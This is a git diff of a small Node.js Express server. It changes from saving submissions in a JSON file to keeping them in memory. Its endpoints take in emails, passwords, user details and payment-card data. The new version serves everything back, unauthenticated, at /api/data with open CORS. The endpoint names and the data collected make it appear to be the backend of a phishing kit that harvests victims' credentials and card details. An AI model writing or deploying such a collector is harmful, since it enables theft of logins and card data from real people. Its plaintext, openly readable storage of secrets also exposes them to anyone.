@@ -1,151 +1,48 @@
 const express = require('express');
     app = express();
-    path = require('path');
-    fs = require ('fs');
+    // path = require('path');
+    // fs = require ('fs');
     cors = require('cors');
+    bodyParser = require('body-parser');
  
     app.use(cors());
-    
+    app.use(bodyParser.json());
 // Request 
 
 app.get('/', (req, res) => {
     res.send('Server is running...!')
 })
 
-app.post('/save-email', (req, res) => {
-    let email = req.body;
+let UserAccount = [];
 
-    // read the existing data from the JSON file
-    fs.readFile('./data.json', (err, jsonData) => {
-        if (err) {
-            res.status(500).send('Internal server error');
-            return;
-        }
-
-        let emailData = JSON.parse(jsonData);
-
-        // check if the emails array exists
-        if (!emailData.emails) {
-            emailData.emails = [];
-        }
-
-        // add the new email to the array
-        emailData.emails.push(email);
-
-        // write the updated data back to the file
-        fs.writeFile('./data.json', JSON.stringify(emailData, null, 4), (err) => {
-            if (err) {
-                res.status(500).send('Internal server error');
-                return;
-            }
-            res.status(200).send('OK');
-        });
-    });
+app.get('/api/data', (req, res) => {
+    res.status(200).send(UserAccount);
 });
 
-app.post("/save-mdp", (req, res) => {
-    let mdp = req.body;
-    
-    // read the existing data from the JSON file
-    fs.readFile('./data.json', (err, jsonData) => {
-        if (err) {
-            res.status(500).send('Internal server error');
-            return;
-        }
+app.post('/get-email', (req, res) => {
+    const email = req.body;
+    UserAccount.push(email);
+    res.status(200).send('Email received and stored!'); 
+});
 
-        let mdpData = JSON.parse(jsonData);
+app.post('/get-psw', (req, res) => {
+    const psw = req.body;
+    UserAccount.push(psw);
+    res.status(200).send('Password received and stored!'); 
+});
 
-        // check if the password array exists
-        if (!mdpData.passwords) {
-            mdpData.passwords = [];
-        }
+app.post('/get-infoU', (req, res) => {
+    const infoU = req.body;
+    UserAccount.push(infoU);
+    res.status(200).send('InfoUser received and stored!'); 
+});
 
-        // add the new email to the array
-        mdpData.passwords.push(mdp);
+app.post('/get-userC', (req, res) => {
+    const userC = req.body;
+    UserAccount.push(userC);
+    res.status(200).send('UserCard received and stored!'); 
+});
 
-        // write the updated data back to the file
-        fs.writeFile('./data.json', JSON.stringify(mdpData, null, 4), (err) => {
-            if (err) {
-                res.status(500).send('Internal server error');
-                return;
-            }
-            res.status(200).send('OK');
-        });
-    });
-    
-})
-
-app.post("/infoUser", (req, res) => {
-    let infoUser = req.body;
-
-    fs.readFile('./data.json', (err, jsonData) => {
-        if (err){
-            res.status(500).send('Internal server error');
-            return;
-        }
-
-        let Userdata = JSON.parse(jsonData);
-
-        if(!Userdata.info_user) {
-            Userdata.info_user = [];
-        }
-
-        Userdata.info_user.push(infoUser);
-
-        fs.writeFile("./data.json", JSON.stringify(Userdata, null, 4), (err) => {
-            if (err) {
-                res.status(500).send('Internal server error');
-                return;
-            }
-            res.status(200).send('OK');
-        })
-    })
-})
-
-app.post("/carteC", (req, res) => {
-    let infocarte = req.body;
-
-    fs.readFile('./data.json', (err, jsonData) => {
-        if (err){
-            res.status(500).send('Internal server error');
-            return;
-        }
-
-        let UserCarte = JSON.parse(jsonData);
-
-        if(!UserCarte.carte_user) {
-            UserCarte.carte_user = [];
-        }
-
-        UserCarte.carte_user.push(infocarte);
-
-        fs.writeFile("./data.json", JSON.stringify(UserCarte, null, 4), (err) => {
-            if (err) {
-                res.status(500).send('Internal server error');
-                return;
-            }
-            res.status(200).send('OK');
-        })
-    })
-
-})
-
-app.get("/view-data", (req, res) => {
-    // read the data from the JSON file
-    fs.readFile(`${workDir}/data.json`, (err, jsonData) => {
-      if (err) {
-        console.error(err);
-        res.status(500).send('Internal server error');
-        return;
-      }
-  
-      console.log(jsonData); // log the JSON data to the console
-  
-      // parse the JSON data and send it to the client
-      let mdpData = JSON.parse(jsonData);
-      res.send(mdpData);
-    });
-  });
 // End Request 
 
 app.listen(8080, () => {
